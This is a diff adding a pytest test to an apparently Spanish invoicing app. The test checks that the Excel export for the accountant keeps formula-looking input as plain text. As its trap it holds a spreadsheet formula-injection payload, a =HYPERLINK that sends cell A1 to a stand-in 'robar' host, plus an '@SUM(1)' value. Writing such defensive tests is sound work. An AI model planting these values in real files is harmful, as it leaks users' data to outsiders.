@@ -96,3 +96,16 @@ def test_excel_for_the_gestoria(store):
     assert wb["Facturas expedidas"]["A1"].value == "Fecha expedición"
     gastos = [(r[0].date(), r[2], r[4]) for r in wb["Gastos"].iter_rows(min_row=2, values_only=True)]
     assert (date(2026, 10, 6), "Alquiler", 900) in gastos and len(gastos) == 2
+
+
+def test_excel_keeps_formula_looking_text_as_text(store):
+    """A supplier or concept typed as «=HYPERLINK(…)» must not run when the accountant opens the book."""
+    from openpyxl import load_workbook
+
+    trap = '=HYPERLINK("http://ejemplo.invalid/robar?d="&A1,"Ver")'
+    store.add_expense(date(2026, 10, 6), "Alquiler", trap, 90.0, invoice_number="F-1",
+                      issuer_tax_id="a81948077", issuer_name="@SUM(1)", tax_rate=21)
+    wb = load_workbook(BytesIO(store.gestoria_workbook(date(2026, 10, 1), date(2027, 1, 1))))
+    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]
+    assert not [c.coordinate for c in cells if c.data_type == "f"]
+    assert trap in [c.value for c in cells]  # still readable, exactly as typed
